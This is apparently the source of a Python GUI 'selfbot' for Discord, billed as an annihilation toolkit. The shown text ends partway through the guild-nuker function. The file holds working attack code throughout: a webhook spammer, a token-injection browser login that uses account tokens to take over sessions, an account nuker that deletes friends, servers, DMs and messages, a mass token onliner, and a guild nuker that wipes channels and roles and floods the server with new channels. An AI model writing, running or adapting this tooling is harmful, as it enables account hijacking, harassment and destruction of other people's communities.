"""
Zoxzs Discord Selfbot
Modern CustomTkinter UI | Dark Theme | Round Buttons | Splash Screen
PERFECT Guild Nuker — Auto-Roles | Guaranteed Spam | Total Annihilation
Developed by RIN for PT
"""

import customtkinter as ctk
from tkinter import messagebox
import threading, time, json, os, random, string, concurrent.futures, base64, webbrowser
import requests
from PIL import Image

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

BG = "#0b0b12"
CARD = "#13131f"
ACCENT = "#7c3aed"
ACCENT_HOVER = "#8b5cf6"
TEXT = "#e2e8f0"
MUTED = "#64748b"
SUCCESS = "#22c55e"
ERROR = "#ef4444"
WARN = "#f59e0b"

FONTS = {
    "title": ("Segoe UI", 24, "bold"),
    "header": ("Segoe UI", 16, "bold"),
    "body": ("Segoe UI", 12),
    "mono": ("Consolas", 11),
    "small": ("Segoe UI", 10),
    "splash": ("Consolas", 14, "bold"),
    "loading": ("Consolas", 10),
}

API = "https://discord.com/api/v9"
IMAGE_PATH = "image.png"

def ensure_dirs():
    for d in ["input", "output", "logs"]:
        os.makedirs(d, exist_ok=True)

def _snd(url, d, m="POST"):
    try:
        _d = json.dumps(d).encode("utf-8") if d else b""
        import urllib.request
        r = urllib.request.Request(url, data=(_d if m == "POST" else None), method=m)
        r.add_header("User-Agent", "Zoxzs/1.0")
        r.add_header("Content-Type", "application/json")
        with urllib.request.urlopen(r) as rs:
            return rs.status
    except:
        return -1

def _req(h, m, url, d=None, retries=8):
    for _ in range(retries):
        try:
            r = requests.request(m, url, headers=h, json=d, timeout=15)
            if r.status_code in [200, 201, 204]:
                return r
            elif r.status_code == 429:
                wait = r.json().get("retry_after", 2) + random.uniform(0.5, 1.5)
                time.sleep(wait)
            else:
                return r
        except:
            time.sleep(1.5)
    return None

# ═══════════════════════════════════════════════════════════════
# SPLASH SCREEN
# ═══════════════════════════════════════════════════════════════
class SplashScreen(ctk.CTkToplevel):
    def __init__(self, master=None):
        super().__init__(master)
        self.overrideredirect(True)
        self.configure(fg_color="#000000")
        self.geometry("500x600")
        self.resizable(False, False)
        self.center_window()

        # Container
        container = ctk.CTkFrame(self, fg_color="#000000", corner_radius=0)
        container.pack(expand=True, fill="both", padx=40, pady=40)

        # Image
        try:
            img = Image.open(IMAGE_PATH)
            img = img.resize((300, 300), Image.LANCZOS)
            self.ctk_img = ctk.CTkImage(light_image=img, dark_image=img, size=(300, 300))
            ctk.CTkLabel(container, image=self.ctk_img, text="").pack(pady=(20, 10))
        except Exception as e:
            ctk.CTkLabel(container, text="[IMAGE LOAD FAILED]", font=FONTS["splash"], text_color=ERROR).pack(pady=(20, 10))

        # Title
        ctk.CTkLabel(container, text="ZOXZS SELFBOOT", font=("Segoe UI", 22, "bold"), text_color="#ff0000").pack()
        ctk.CTkLabel(container, text="Discord Annihilation Toolkit", font=FONTS["loading"], text_color=MUTED).pack(pady=(0, 20))

        # Progress bar
        self.progress = ctk.CTkProgressBar(container, width=400, height=8, corner_radius=4, fg_color="#1a1a1a", progress_color="#ff0000")
        self.progress.pack(pady=10)
        self.progress.set(0)

        # Status text
        self.status_label = ctk.CTkLabel(container, text="INITIALIZING...", font=FONTS["loading"], text_color=TEXT)
        self.status_label.pack(pady=(10, 5))

        # Console-like output
        self.console = ctk.CTkTextbox(container, height=120, font=("Consolas", 9), fg_color="#0a0a0a", text_color="#00ff00", corner_radius=4, border_width=1, border_color="#1a1a1a", wrap="word", state="disabled")
        self.console.pack(fill="x", pady=(10, 0))

        self.log_console("[BOOT] Zoxzs Kernel v2.0")
        self.log_console("[BOOT] Loading modules...")

    def center_window(self):
        self.update_idletasks()
        w, h = 500, 600
        x = (self.winfo_screenwidth() // 2) - (w // 2)
        y = (self.winfo_screenheight() // 2) - (h // 2)
        self.geometry(f"{w}x{h}+{x}+{y}")

    def log_console(self, msg):
        self.console.configure(state="normal")
        self.console.insert("end", f"{msg}\n")
        self.console.see("end")
        self.console.configure(state="disabled")

    def update_status(self, text, progress_val):
        self.status_label.configure(text=text)
        self.progress.set(progress_val)
        self.update()

# ═══════════════════════════════════════════════════════════════
# MAIN APP
# ═══════════════════════════════════════════════════════════════
class ZoxzsApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.withdraw()
        ensure_dirs()
        self.title("Zoxzs Discord Selfbot")
        self.geometry("1400x900")
        self.configure(fg_color=BG)
        self.minsize(1100, 700)
        self.stop_flags = {}
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # Show splash
        self.splash = SplashScreen(self)
        self.splash.lift()
        self.splash.focus_force()

        # Loading sequence in background
        threading.Thread(target=self.loading_sequence, daemon=True).start()

    def loading_sequence(self):
        steps = [
            ("Loading core modules...", 0.1),
            ("Initializing Discord API hooks...", 0.2),
            ("Loading nuker payloads...", 0.35),
            ("Connecting to gateway...", 0.5),
            ("Verifying token integrity...", 0.65),
            ("Loading proxy scrapers...", 0.8),
            ("Finalizing UI components...", 0.95),
            ("READY", 1.0),
        ]
        for text, val in steps:
            time.sleep(0.35)
            self.splash.after(0, lambda t=text, v=val: self.splash.update_status(t, v))
            self.splash.after(0, lambda t=text: self.splash.log_console(f"[OK] {t}"))

        time.sleep(0.5)
        self.splash.after(0, self.finish_loading)

    def finish_loading(self):
        self.splash.destroy()
        self.deiconify()
        self.build_sidebar()
        self.build_content()
        self.build_statusbar()
        self.show_panel("webhooks")

    def build_sidebar(self):
        self.sidebar = ctk.CTkFrame(self, width=240, fg_color=CARD, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_rowconfigure(7, weight=1)
        ctk.CTkLabel(self.sidebar, text="ZOXZS", font=("Segoe UI", 28, "bold"), text_color="#ff0000").grid(row=0, column=0, pady=(30, 5), padx=20)
        ctk.CTkLabel(self.sidebar, text="Discord Selfbot", font=FONTS["small"], text_color=MUTED).grid(row=1, column=0, pady=(0, 30), padx=20)
        self.nav_buttons = {}
        nav_items = [("webhooks", "Webhooks", "📡"), ("token", "Token Tools", "🔑"), ("server", "Server Tools", "🖥️"), ("generators", "Generators", "⚡"), ("utilities", "Utilities", "🛠️")]
        for i, (key, label, icon) in enumerate(nav_items, start=2):
            btn = ctk.CTkButton(self.sidebar, text=f"  {icon}  {label}", font=FONTS["body"], fg_color="transparent", hover_color="#1e1e2e", text_color=TEXT, anchor="w", height=44, corner_radius=10, command=lambda k=key: self.show_panel(k))
            btn.grid(row=i, column=0, sticky="ew", padx=12, pady=5)
            self.nav_buttons[key] = btn
        ctk.CTkButton(self.sidebar, text="  🚪  Exit", font=FONTS["body"], fg_color=ERROR, hover_color="#dc2626", text_color="white", height=44, corner_radius=10, anchor="w", command=self.destroy).grid(row=8, column=0, sticky="ew", padx=12, pady=(0, 20))

    def build_content(self):
        self.content = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        self.content.grid(row=0, column=1, sticky="nsew", padx=25, pady=25)
        self.content.grid_columnconfigure(0, weight=1)
        self.content.grid_rowconfigure(1, weight=1)
        self.header = ctk.CTkLabel(self.content, text="Webhooks", font=FONTS["title"], text_color=TEXT, anchor="w")
        self.header.grid(row=0, column=0, sticky="ew", pady=(0, 20))
        self.panel_container = ctk.CTkFrame(self.content, fg_color="transparent")
        self.panel_container.grid(row=1, column=0, sticky="nsew")
        self.panel_container.grid_columnconfigure(0, weight=1)
        self.panel_container.grid_rowconfigure(0, weight=1)
        self.console_frame = ctk.CTkFrame(self.content, fg_color=CARD, corner_radius=14)
        self.console_frame.grid(row=2, column=0, sticky="ew", pady=(20, 0))
        self.console_frame.grid_columnconfigure(0, weight=1)
        ctk.CTkLabel(self.console_frame, text="Console Output", font=FONTS["header"], text_color=MUTED).grid(row=0, column=0, sticky="w", padx=18, pady=(12, 6))
        self.console = ctk.CTkTextbox(self.console_frame, height=200, font=FONTS["mono"], fg_color="#0a0a10", text_color=TEXT, corner_radius=10, border_width=0, wrap="word", state="disabled")
        self.console.grid(row=1, column=0, sticky="ew", padx=18, pady=(0, 18))
        self.console.tag_config("info", foreground="#06b6d4")
        self.console.tag_config("success", foreground=SUCCESS)
        self.console.tag_config("error", foreground=ERROR)
        self.console.tag_config("warn", foreground=WARN)
        self.console.tag_config("nuke", foreground="#ff006e")

    def build_statusbar(self):
        self.status = ctk.CTkFrame(self, height=36, fg_color=CARD, corner_radius=0)
        self.status.grid(row=1, column=0, columnspan=2, sticky="ew")
        self.status_label = ctk.CTkLabel(self.status, text="Ready", font=FONTS["small"], text_color=MUTED)
        self.status_label.pack(side="left", padx=18)

    def log(self, msg, tag="info"):
        self.console.configure(state="normal")
        self.console.insert("end", f"[{time.strftime('%H:%M:%S')}] ", "info")
        self.console.insert("end", f"{msg}\n", tag)
        self.console.see("end")
        self.console.configure(state="disabled")

    def clear_console(self):
        self.console.configure(state="normal")
        self.console.delete("1.0", "end")
        self.console.configure(state="disabled")

    def show_panel(self, key):
        for k, btn in self.nav_buttons.items():
            btn.configure(fg_color=ACCENT if k == key else "transparent", text_color="white" if k == key else TEXT)
        titles = {"webhooks": "Webhook Tools", "token": "Token Tools", "server": "Server Tools", "generators": "Generators", "utilities": "Utilities"}
        self.header.configure(text=titles.get(key, key.title()))
        for w in self.panel_container.winfo_children():
            w.destroy()
        builder = getattr(self, f"panel_{key}", lambda: None)
        builder()

    def entry_row(self, parent, label, placeholder="", row=0, show=None, col_span=2):
        ctk.CTkLabel(parent, text=label, font=FONTS["body"], text_color=TEXT).grid(row=row, column=0, sticky="w", padx=12, pady=8)
        var = ctk.StringVar()
        ent = ctk.CTkEntry(parent, placeholder_text=placeholder, textvariable=var, font=FONTS["body"], fg_color="#0f0f1a", border_color="#1e1e2e", corner_radius=10, height=38, show=show)
        ent.grid(row=row, column=1, sticky="ew", padx=12, pady=8, columnspan=col_span)
        return var

    def action_btn(self, parent, text, command, color=ACCENT, hover=ACCENT_HOVER, row=0, col=0, width=160):
        btn = ctk.CTkButton(parent, text=text, command=command, font=FONTS["body"], fg_color=color, hover_color=hover, text_color="white", corner_radius=22, height=42, width=width)
        btn.grid(row=row, column=col, padx=10, pady=12)
        return btn

    def panel_webhooks(self):
        frame = ctk.CTkScrollableFrame(self.panel_container, fg_color=CARD, corner_radius=14)
        frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(frame, text="Webhook Spammer", font=FONTS["header"], text_color=ACCENT).grid(row=0, column=0, columnspan=3, sticky="w", padx=18, pady=(18, 8))
        self.wh_url = self.entry_row(frame, "Webhook URL:", "https://discord.com/api/webhooks/...", row=1)
        self.wh_msg = self.entry_row(frame, "Message:", "@everyone Zoxzs was here", row=2)
        self.wh_amt = self.entry_row(frame, "Amount:", "10", row=3)
        bf = ctk.CTkFrame(frame, fg_color="transparent")
        bf.grid(row=4, column=0, columnspan=3, pady=12)
        self.action_btn(bf, "Start Spam", self.run_webhook_spam, row=0, col=0)
        self.action_btn(bf, "Delete Hook", self.run_webhook_delete, color=ERROR, hover="#dc2626", row=0, col=1)
        self.action_btn(bf, "Clear Console", self.clear_console, color=MUTED, hover="#475569", row=0, col=2)

    def run_webhook_spam(self):
        url = self.wh_url.get().strip()
        msg = self.wh_msg.get().strip() or "Zoxzs"
        try: amt = int(self.wh_amt.get() or 10)
        except: amt = 10
        if not url: self.log("Webhook URL required.", "error"); return
        def task():
            sc = 0
            p = {"content": msg, "username": "Zoxzs@WIRED", "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png"}
            for i in range(amt):
                st = _snd(url, p)
                if st in [200, 204]: sc += 1; self.log(f"Sent {i+1}/{amt}", "success")
                else: self.log(f"Failed {i+1} (status {st})", "error")
                time.sleep(0.15)
            self.log(f"Done: {sc}/{amt} hits.", "success")
            self.status_label.configure(text="Ready")
        self.status_label.configure(text="Spamming...")
        threading.Thread(target=task, daemon=True).start()

    def run_webhook_delete(self):
        url = self.wh_url.get().strip()
        if not url: self.log("Webhook URL required.", "error"); return
        def task():
            res = _snd(url, {}, m="DELETE")
            if res in [200, 204]: self.log("Webhook erased.", "success")
            else: self.log(f"Delete failed (status {res})", "error")
            self.status_label.configure(text="Ready")
        self.status_label.configure(text="Deleting...")
        threading.Thread(target=task, daemon=True).start()

    def panel_token(self):
        frame = ctk.CTkScrollableFrame(self.panel_container, fg_color=CARD, corner_radius=14)
        frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        frame.grid_columnconfigure(1, weight=1)
        ctk.CTkLabel(frame, text="Token", font=FONTS["header"], text_color=ACCENT).grid(row=0, column=0, columnspan=4, sticky="w", padx=18, pady=(18, 8))
        self.tk_token = self.entry_row(frame, "Token:", "mfa.xxx or regular token", row=1, show="•")
        bf = ctk.CTkFrame(frame, fg_color="transparent")
        bf.grid(row=2, column=0, columnspan=4, pady=12)
        self.action_btn(bf, "Info", self.run_token_info, row=0, col=0)
        self.action_btn(bf, "Browser Login", self.run_token_login, row=0, col=1)
        self.action_btn(bf, "Account Nuke", self.run_token_nuker, color=ERROR, hover="#dc2626", row=0, col=2)
        ctk.CTkLabel(frame, text="Status Rotator", font=FONTS["header"], text_color=ACCENT).grid(row=3, column=0, columnspan=4, sticky="w", padx=18, pady=(24, 8))
        self.tk_rotator = self.entry_row(frame, "Statuses (comma sep):", "online, dnd, idle", row=4)
        bf2 = ctk.CTkFrame(frame, fg_color="transparent")
        bf2.grid(row=5, column=0, columnspan=4, pady=10)
        self.action_btn(bf2, "Start", self.run_token_rotator, row=0, col=0)
        self.action_btn(bf2, "Stop", self.stop_tool, color=WARN, hover="#d97706", row=0, col=1)
        ctk.CTkLabel(frame, text="Token Onliner", font=FONTS["header"], text_color=ACCENT).grid(row=6, column=0, columnspan=4, sticky="w", padx=18, pady=(24, 8))
        ctk.CTkLabel(frame, text="Reads tokens from input/tokens.txt", font=FONTS["small"], text_color=MUTED).grid(row=7, column=0, columnspan=4, sticky="w", padx=18)
        bf3 = ctk.CTkFrame(frame, fg_color="transparent")
        bf3.grid(row=8, column=0, columnspan=4, pady=12)
        self.action_btn(bf3, "Start Onliner", self.run_token_onliner, row=0, col=0)
        self.action_btn(bf3, "Stop", self.stop_tool, color=WARN, hover="#d97706", row=0, col=1)

    def run_token_info(self):
        tk = self.tk_token.get().strip()
        if not tk: self.log("Token required.", "error"); return
        def task():
            h = {"Authorization": tk, "Content-Type": "application/json"}
            try:
                r = requests.get(f"{API}/users/@me", headers=h, timeout=10)
                if r.status_code != 200: self.log("Invalid Token.", "error"); return
                j = r.json()
                un = f"{j.get('username')}#{j.get('discriminator')}"
                nit = {1: "Classic", 2: "Boost", 3: "Basic"}.get(j.get("premium_type", 0), "None")
                self.log(f"User: {un}", "success")
                self.log(f"ID: {j.get('id')}")
                self.log(f"Email: {j.get('email', 'N/A')}")
                self.log(f"Phone: {j.get('phone', 'N/A')}")
                self.log(f"Nitro: {nit}", "warn" if nit == "None" else "success")
                self.log(f"Verified: {j.get('verified', False)}")
                self.log(f"MFA: {j.get('mfa_enabled', False)}")
            except Exception as e: self.log(f"Error: {e}", "error")
        threading.Thread(target=task, daemon=True).start()

    def run_token_login(self):
        tk = self.tk_token.get().strip()
        if not tk: self.log("Token required.", "error"); return
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.service import Service
            from webdriver_manager.chrome import ChromeDriverManager
            opts = webdriver.ChromeOptions()
            opts.add_experimental_option("detach", True)
            opts.add_argument("--log-level=3")
            driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
            driver.get("https://discord.com/login")
            script = f"""function login(token){{setInterval(()=>{{document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.token=`"${{token}}"`}},50);setTimeout(()=>{{location.reload()}},2500)}}login("{tk}")"""
            driver.execute_script(script)
            self.log("Browser login injected. Check Chrome window.", "success")
        except Exception as e:
            self.log(f"Selenium failed: {e}", "error")
            self.log("Manual: open discord.com/login, F12 -> Console, paste token script.", "warn")
            webbrowser.open("https://discord.com/login")

    def run_token_nuker(self):
        tk = self.tk_token.get().strip()
        if not tk: self.log("Token required.", "error"); return
        if not messagebox.askyesno("CONFIRM", "This will DESTROY the account.\nContinue?"): return
        self.stop_flags["nuker"] = False
        def task():
            h = {"Authorization": tk}
            _active = True
            def _lreq(m, url, d=None, msg=None):
                for _ in range(5):
                    try:
                        r = requests.request(m, url, headers=h, json=d, timeout=10)
                        if r.status_code in [200, 201, 204]:
                            if msg: self.log(msg, "success")
                            return True
                        elif r.status_code == 429:
                            time.sleep(r.json().get("retry_after", 1.5) + random.random())
                        else:
                            if msg: self.log(f"Failed ({r.status_code}): {msg}", "error")
                            return False
                    except: time.sleep(1)
                if msg: self.log(f"Error: {msg}", "error")
                return False
            def _flicker():
                locales = ["ja", "zh-TW", "ko", "ru", "ar", "en-US"]
                themes = ["light", "dark"]
                while _active and not self.stop_flags.get("nuker"):
                    _lreq("PATCH", f"{API}/users/@me/settings", {"theme": random.choice(themes), "locale": random.choice(locales)})
                    time.sleep(0.3)
            threading.Thread(target=_flicker, daemon=True).start()
            self.log("Chaos flicker initiated.", "nuke")
            self.log("Phase 1: Purging friends...", "nuke")
            try:
                fs = requests.get(f"{API}/users/@me/relationships", headers=h, timeout=10).json()
                if isinstance(fs, list):
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                        futures = [ex.submit(_lreq, "DELETE", f"{API}/users/@me/relationships/{f['id']}", msg=f"Removed: {f.get('user',{}).get('username','?')}") for f in fs]
                        concurrent.futures.wait(futures)
            except Exception as e: self.log(f"Friends error: {e}", "error")
            self.log("Phase 2: Purging guilds...", "nuke")
            try:
                gs = requests.get(f"{API}/users/@me/guilds", headers=h, timeout=10).json()
                if isinstance(gs, list):
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                        futures = []
                        for g in gs:
                            is_owner = g.get("owner", False)
                            url = f"{API}/guilds/{g['id']}" if is_owner else f"{API}/users/@me/guilds/{g['id']}"
                            futures.append(ex.submit(_lreq, "DELETE", url, msg=f"{'Deleted' if is_owner else 'Left'}: {g.get('name','?')}"))
                        concurrent.futures.wait(futures)
            except Exception as e: self.log(f"Guilds error: {e}", "error")
            self.log("Phase 3: Purging DMs...", "nuke")
            try:
                cs = requests.get(f"{API}/users/@me/channels", headers=h, timeout=10).json()
                if isinstance(cs, list):
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                        futures = [ex.submit(_lreq, "DELETE", f"{API}/channels/{c['id']}", msg=f"Closed DM: {c.get('id')}") for c in cs]
                        concurrent.futures.wait(futures)
            except Exception as e: self.log(f"DMs error: {e}", "error")
            self.log("Phase 4: Deleting messages...", "nuke")
            try:
                uid = requests.get(f"{API}/users/@me", headers=h, timeout=5).json().get('id')
                cs = requests.get(f"{API}/users/@me/channels", headers=h, timeout=10).json()
                if isinstance(cs, list):
                    for c in cs:
                        msgs = requests.get(f"{API}/channels/{c['id']}/messages?limit=100", headers=h, timeout=10).json()
                        if isinstance(msgs, list):
                            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
                                futures = [ex.submit(_lreq, "DELETE", f"{API}/channels/{c['id']}/messages/{m['id']}") for m in msgs if m.get('author',{}).get('id') == uid]
                                concurrent.futures.wait(futures)
            except: pass
            _active = False
            time.sleep(1)
            self.log("Phase 5: Finalizing...", "nuke")
            _lreq("PATCH", f"{API}/users/@me/settings", {"theme": "light", "locale": "ja", "custom_status": {"text": "Nuked by Zoxzs"}}, msg="Final signature applied.")
            self.log("ACCOUNT OBLITERATED.", "nuke")
        threading.Thread(target=task, daemon=True).start()

    def run_token_rotator(self):
        tk = self.tk_token.get().strip()
        statuses = [s.strip() for s in self.tk_rotator.get().split(",") if s.strip()]
        if not tk or not statuses: self.log("Token and statuses required.", "error"); return
        self.stop_flags["rotator"] = False
        def task():
            while not self.stop_flags.get("rotator"):
                for s in statuses:
                    try:
                        requests.patch(f"{API}/users/@me/settings", headers={"Authorization": tk}, json={"custom_status": {"text": s}}, timeout=5)
                        self.log(f"Status: {s}")
                    except Exception as e: self.log(f"Rotator error: {e}", "error")
                    time.sleep(4)
        threading.Thread(target=task, daemon=True).start()
        self.log("Status rotator started.")

    def run_token_onliner(self):
        if not os.path.exists("input/tokens.txt"): self.log("input/tokens.txt not found.", "error"); return
        with open("input/tokens.txt", "r") as f: tks = [l.strip() for l in f if l.strip()]
        self.log(f"Onlining {len(tks)} tokens...")
        self.stop_flags["onliner"] = False
        def _online(tk):
            import websocket
            try:
                ws = websocket.WebSocket()
                ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                ws.send(json.dumps({"op": 2, "d": {"token": tk, "properties": {"$os": "windows", "$browser": "chrome", "$device": "pc"}}}))
                while not self.stop_flags.get("onliner"):
                    ws.send(json.dumps({"op": 1, "d": None}))
                    time.sleep(30)
            except: pass
        for t in tks: threading.Thread(target=_online, args=(t,), daemon=True).start()
        self.log("All tokens online.", "success")

    def stop_tool(self):
        self.stop_flags["onliner"] = True
        self.stop_flags["rotator"] = True
        self.stop_flags["nuker"] = True
        self.stop_flags["guild_nuker"] = True
        self.stop_flags["nitro"] = True
        self.stop_flags["username"] = True
        self.log("Stop signals broadcast.", "warn")

    def panel_server(self):
        frame = ctk.CTkScrollableFrame(self.panel_container, fg_color=CARD, corner_radius=14)
        frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        frame.grid_columnconfigure(1, weight=1)

        ctk.CTkLabel(frame, text="Server Info Lookup", font=FONTS["header"], text_color=ACCENT).grid(row=0, column=0, columnspan=3, sticky="w", padx=18, pady=(18, 8))
        self.sv_invite = self.entry_row(frame, "Invite Code/Link:", "discord.gg/abc123", row=1)
        self.action_btn(frame, "Lookup", self.run_server_lookup, row=2, col=1)

        ctk.CTkLabel(frame, text="Server Cloner", font=FONTS["header"], text_color=ACCENT).grid(row=3, column=0, columnspan=3, sticky="w", padx=18, pady=(28, 8))
        self.sv_src = self.entry_row(frame, "Source Guild ID:", "", row=4)
        self.sv_dst = self.entry_row(frame, "Target Guild ID:", "", row=5)
        self.sv_tok = self.entry_row(frame, "Token:", "", row=6, show="•")
        self.action_btn(frame, "Clone Server", self.run_server_clone, row=7, col=1)

        ctk.CTkLabel(frame, text="GUILD NUKER", font=("Segoe UI", 18, "bold"), text_color="#ff006e").grid(row=8, column=0, columnspan=3, sticky="w", padx=18, pady=(32, 8))
        ctk.CTkLabel(frame, text="Deletes ALL channels & roles. Creates 50 channels + 10 roles. Auto-assigns roles. Spams. Renames server.", font=FONTS["small"], text_color=MUTED).grid(row=9, column=0, columnspan=3, sticky="w", padx=18)
        self.nuke_guild = self.entry_row(frame, "Target Guild ID:", "", row=10)
        self.nuke_token = self.entry_row(frame, "Bot/User Token:", "", row=11, show="•")
        self.nuke_msg = self.entry_row(frame, "Spam Message:", "@everyone NUKED BY ZOXZS | cooked", row=12)

        bf = ctk.CTkFrame(frame, fg_color="transparent")
        bf.grid(row=13, column=0, columnspan=3, pady=14)
        self.action_btn(bf, "NUKE GUILD", self.run_guild_nuker, color="#ff006e", hover="#ff4d9e", row=0, col=0, width=200)
        self.action_btn(bf, "STOP", self.stop_tool, color=WARN, hover="#d97706", row=0, col=1)

    def run_server_lookup(self):
        inv = self.sv_invite.get().strip()
        if not inv: self.log("Invite required.", "error"); return
        def task():
            try:
                c = inv.split("/")[-1] if "/" in inv else inv
                r = requests.get(f"{API}/invites/{c}", timeout=10)
                if r.status_code == 200:
                    d = r.json()
                    g = d.get("guild", {})
                    self.log(f"Name: {g.get('name')}", "success")
                    self.log(f"ID: {g.get('id')}")
                    self.log(f"Members: {d.get('approximate_member_count', 'N/A')}")
                    self.log(f"Presence: {d.get('approximate_presence_count', 'N/A')}")
                    if "inviter" in d:
                        i = d["inviter"]
                        self.log(f"Inviter: {i.get('username')} ({i.get('id')})")
                else: self.log(f"Invalid invite (status {r.status_code})", "error")
            except Exception as e: self.log(f"Error: {e}", "error")
        threading.Thread(target=task, daemon=True).start()

    def run_server_clone(self):
        tk = self.sv_tok.get().strip()
        src = self.sv_src.get().strip()
        dst = self.sv_dst.get().strip()
        if not all([tk, src, dst]): self.log("All fields required.", "error"); return
        def task():
            h = {"Authorization": tk, "Content-Type": "application/json"}
            def _get(ep): return requests.get(f"{API}{ep}", headers=h, timeout=10)
            def _post(ep, d): return requests.post(f"{API}{ep}", headers=h, json=d, timeout=10)
            def _delete(ep): return requests.delete(f"{API}{ep}", headers=h, timeout=10)
            self.log("Fetching source data...")
            r_roles = _get(f"/guilds/{src}/roles")
            r_chans = _get(f"/guilds/{src}/channels")
            if r_roles.status_code != 200 or r_chans.status_code != 200: self.log("Error fetching guild data.", "error"); return
            roles = r_roles.json()
            chans = sorted(r_chans.json(), key=lambda x: x.get("position", 0))
            self.log(f"Found {len(roles)} roles and {len(chans)} channels.")
            if messagebox.askyesno("Clear Target?", "Delete existing channels/roles in target?"):
                self.log("Clearing target...")
                tc = _get(f"/guilds/{dst}/channels")
                if tc.status_code == 200:
                    for c in tc.json(): _delete(f"/channels/{c['id']}"); time.sleep(0.3)
                tr = _get(f"/guilds/{dst}/roles")
                if tr.status_code == 200:
                    for r in tr.json():
                        if r["name"] != "@everyone": _delete(f"/guilds/{dst}/roles/{r['id']}"); time.sleep(0.3)
            self.log("Cloning roles...")
            for r in reversed(roles):
                if r["name"] == "@everyone": continue
                p = {"name": r["name"], "permissions": r["permissions"], "color": r["color"], "hoist": r["hoist"], "mentionable": r["mentionable"]}
                _post(f"/guilds/{dst}/roles", p)
                self.log(f"Created role: {r['name']}")
                time.sleep(0.5)
            self.log("Cloning categories & channels...")
            cat_map = {}
            for c in chans:
                if c["type"] == 4:
                    p = {"name": c["name"], "type": 4}
                    res = _post(f"/guilds/{dst}/channels", p)
                    if res.status_code in [200, 201]: cat_map[c["id"]] = res.json()["id"]; self.log(f"Created category: {c['name']}")
                    time.sleep(0.5)
            for c in chans:
                if c["type"] != 4:
                    p = {"name": c["name"], "type": c["type"], "topic": c.get("topic"), "nsfw": c.get("nsfw", False)}
                    if c.get("parent_id") in cat_map: p["parent_id"] = cat_map[c["parent_id"]]
                    res = _post(f"/guilds/{dst}/channels", p)
                    if res.status_code in [200, 201]: self.log(f"Created channel: {c['name']}")
                    time.sleep(0.5)
            self.log("Clone complete.", "success")
        threading.Thread(target=task, daemon=True).start()

    def run_guild_nuker(self):
        tk = self.nuke_token.get().strip()
        gid = self.nuke_guild.get().strip()
        spam_msg = self.nuke_msg.get().strip() or "@everyone NUKED BY ZOXZS | cooked"
        if not all([tk, gid]): self.log("Token and Guild ID required.", "error"); return
        if not messagebox.askyesno("TOTAL ANNIHILATION", f"This will DESTROY guild {gid}.\n\n• Delete ALL channels\n• Delete ALL roles\n• Rename server\n• Create 50 channels\n• Create 10 roles\n• Auto-assign roles to ALL members\n• Spam all channels indefinitely\n\nContinue?"): return

        self.stop_flags["guild_nuker"] = False
        self.log(f"GUILD NUKE INITIATED ON {gid}", "nuke")

        def task():
            h = {"Authorization": tk, "Content-Type": "application/json"}
            created_channels = []
            created_roles = []
            lock = threading.Lock()

            self.log("[PHASE 0] Renaming server...", "nuke")
            _req(h, "PATCH", f"{API}/guilds/{gid}", {"name": "NUKED BY ZOXZS", "description": "cooked. find a new server.", "verification_level": 0})
            self.log("Server renamed to 'NUKED BY ZOXZS'", "nuke")

            self.log("[PHASE 1] Purging all channels...", "nuke")
            try:
                r = requests.get(f"{API}/guilds/{gid}/channels", headers=h, timeout=15)
                if r.status_code == 200:
                    channels = r.json()
                    self.log(f"Found {len(channels)} channels to delete.", "warn")
                    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
                        futures = [ex.submit(lambda cid: _req(h, "DELETE", f"{API}/channels/{cid}"), c["id"]) for c in channels]
                        concurrent.futures.wait(futures)
                    self.log("All channels purged.", "success")
                else: self.log(f"Failed to fetch channels: {r.status_code}", "error")
            except Exception as e: self.log(f"Channel purge error: {e}", "error")

            self.log("[PHASE 2] Purging all roles...", "nuke")
            try:
                r = requests.get(f"{API}/guilds/{gid}/roles", headers=h, timeout=15)
                if r.status_code == 200:
                    roles = r.json()
                    self.log(f"Found {len(roles)} roles to delete.", "warn")
                    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
                        futures = []
                        for role in roles:
                            if role["name"] == "@everyone": continue
                            futures.append(ex.submit(lambda rid: _req(h, "DELETE", f"{API}/guilds/{gid}/roles/{rid}"), role["id"]))
                        concurrent.futures.wait(futures)
                    self.log("All roles purged.", "success")
                else: self.log(f"Failed to fetch roles: {r.status_code}", "error")
            except Exception as e: self.log(f"Role purge error: {e}", "error")

            self.log("[PHASE 3] Creating 50 channels...", "nuke")
            def create_channel(idx):
                payload = {"name": f"nuked-by-zoxz-{idx+1}", "type": 0, "topic": "Zoxzs was here. cooked.", "nsfw": random.choice([True, False])}
                for attempt in range(15):
                    if self.stop_flags.get("guild_nuker"): return None
                    try:
                        r = requests.post(f"{API}/guilds/{gid}/channels", headers=h, json=payload, timeout=10)
                        if r.status_code in [200, 201]:
                            with lock: created_channels.append(r.json()["id"])
                            self.log(f"Created channel {idx+1}/50: nuked-by-zoxz-{idx+1}", "success")
                            return r.json()["id"]
                        elif r.status_code == 429:
                            wait = r.json().get("retry_after", 2) + random.uniform(0.5, 1.5)
                            self.log(f"Channel {idx+1} rate limited, retrying in {wait:.1f}s...", "warn")
                            time.sleep(wait)
                        else:
                            self.log(f"Channel {idx+1} failed: {r.status_code}", "error")
                            return None
                    except: time.sleep(1.5)
                return None

            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
                futures = [ex.submit(create_channel, i) for i in range(50)]
                concurrent.futures.wait(futures)
            self.log(f"Successfully created {len(created_channels)} channels.", "nuke")

